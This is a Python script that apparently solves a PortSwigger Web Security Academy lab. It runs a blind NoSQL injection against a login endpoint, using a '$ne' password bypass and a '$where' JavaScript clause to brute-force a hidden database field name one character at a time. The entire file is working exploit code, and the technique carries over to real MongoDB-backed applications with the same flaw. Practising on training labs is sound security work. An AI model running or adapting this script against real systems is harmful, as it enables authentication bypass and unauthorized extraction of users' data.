import requests
from string import ascii_letters

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl

    def extractFieldNames(self, fieldPosition):
        LOGIN_ENDPOINT = '/login'
        LAST_CHARACTER = ascii_letters[-1]
        username = 'carlos'
        password = {
            '$ne': 'foobar'
        }
        fieldName = str()
        while True:
            for character in ascii_letters:
                payload = f'^{fieldName}{character}.*' if fieldName else f'^{character}.*'
                whereOperatorKey = f'Object.keys(this)[{fieldPosition}].match("{payload}")'
                print(f'[*] Sending payload: {whereOperatorKey}', end='\r')

                loginData = {
                    'username': username,
                    'password': password,
                    '$where': whereOperatorKey
                }
                loginRespond = requests.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', json=loginData)
                isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                isLastCharacter = character == LAST_CHARACTER
                isEmptyFieldName = True if len(fieldName) == 0 else False

                if not isValidCharacter and isLastCharacter and isEmptyFieldName:
                    print(f'[-] Looped through all possible characters, no luck. This field position {fieldPosition} doesn\'t have a field?')
                    return
                if not isValidCharacter and isLastCharacter:
                    print('[-] Looped through all possible characters, no luck. Maybe we found all the characters?')
                    print(f'[*] Field name: {fieldName}')
                    return
                if isValidCharacter:
                    fieldName += character
                    print(f'\n[+] Found valid character "{character}" on field position {fieldPosition}')
                    break

if __name__ == '__main__':
    baseUrl = 'https://0a2b00730405fb4c80aa1749002a0089.web-security-academy.net'
    exploit = Exploit(baseUrl)

    # you can change your minimum/maximum field position here
    MINIMUM_FIELD_POSITION = 4
    MAXIMUM_FIELD_POSITION = 5
    for fieldPosition in range(MINIMUM_FIELD_POSITION, MAXIMUM_FIELD_POSITION):
        exploit.extractFieldNames(fieldPosition)

